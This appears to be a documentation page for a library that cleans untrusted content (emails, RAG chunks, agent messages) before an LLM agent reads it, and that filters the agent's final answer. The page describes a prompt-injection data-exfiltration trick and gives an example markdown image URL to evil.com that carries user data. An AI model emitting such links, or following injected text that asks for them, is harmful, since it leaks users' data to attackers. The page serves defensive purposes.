# Emails, RAG and final answers

Not everything untrusted comes from a tool call. RAG chunks, emails you fetch yourself, and messages from other agents need cleaning too.

## Checking content directly

```ts
const safeText = await shield.checkIn(emailHtml, { source: "email:inbox", sessionId: conversationId });
```

This cleans and labels the content and taints the conversation, exactly like a tool result. Plain objects and arrays are cleaned string by string.

What to do with flagged content is set in the config:

```yaml
checkIn:
  onFlagged: label   # label (default) | redact | drop
```

- `label` keeps the content and marks it `risk="high"`. Nothing is ever lost.
- `redact` removes flagged sentences. Attacks hidden in base64 or `alt` text can survive, and content flagged only by the classifier is dropped.
- `drop` replaces flagged content with a short notice.

## The agent's final answer

An agent can be tricked into ending its answer with an image like `![](https://evil.com/p.png?d=<your data>)`. The chat UI loads the image, and the data is gone, with no tool call at all.

```ts
const shown = shield.checkOutput(answer, { sessionId: conversationId });
```

`checkOutput` removes images (markdown, reference-style and `<img>`) to sites not in `output.allowImageDomains`, removes links that carry encoded data, and hides secrets.

```yaml
output:
  allowImageDomains: [cdn.mycompany.com]
```

::: tip
Call `checkOutput` yourself before showing an answer. Nothing calls it automatically yet.
:::
